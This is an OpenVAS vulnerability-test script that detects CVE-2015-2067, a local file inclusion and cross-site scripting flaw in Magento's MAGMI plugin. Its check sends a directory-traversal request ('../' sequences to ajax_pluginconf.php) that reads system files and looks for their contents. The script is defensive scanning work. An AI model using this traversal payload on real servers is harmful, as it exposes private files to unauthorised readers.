###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_magento_lfi_02_15.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Magento Server MAGMI Cross Site Scripting / Local File Inclusion
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:magmi:magmi';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105196");
  script_cve_id("CVE-2015-2067");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 11872 $");

  script_name("Magento Server MAGMI Cross Site Scripting / Local File Inclusion");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130250/Magento-Server-MAGMI-Cross-Site-Scripting-Local-File-Inclusion.html");

  script_tag(name:"impact", value:"Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to read arbitrary files in the context of the application. This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");
  script_tag(name:"solution", value:"Update to MAGMI 0.7.22 or later.");
  script_tag(name:"summary", value:"Magento Server MAGMI is prone to cross site scripting and local file inclusion vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-02-06 17:04:13 +0100 (Fri, 06 Feb 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("sw_magento_magmi_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("magmi/installed");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if (dir == "/") dir = "";

files = traversal_files();

foreach file ( keys( files ) )
{
  url = dir + '/web/ajax_pluginconf.php?file=../../../../../../../../../../../' + files[file] + '&plugintype=utilities&pluginclass=CustomSQLUtility';

  if( http_vuln_check( port:port, url:url, pattern:file ) )
  {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit(0);
  }
}

exit(99);
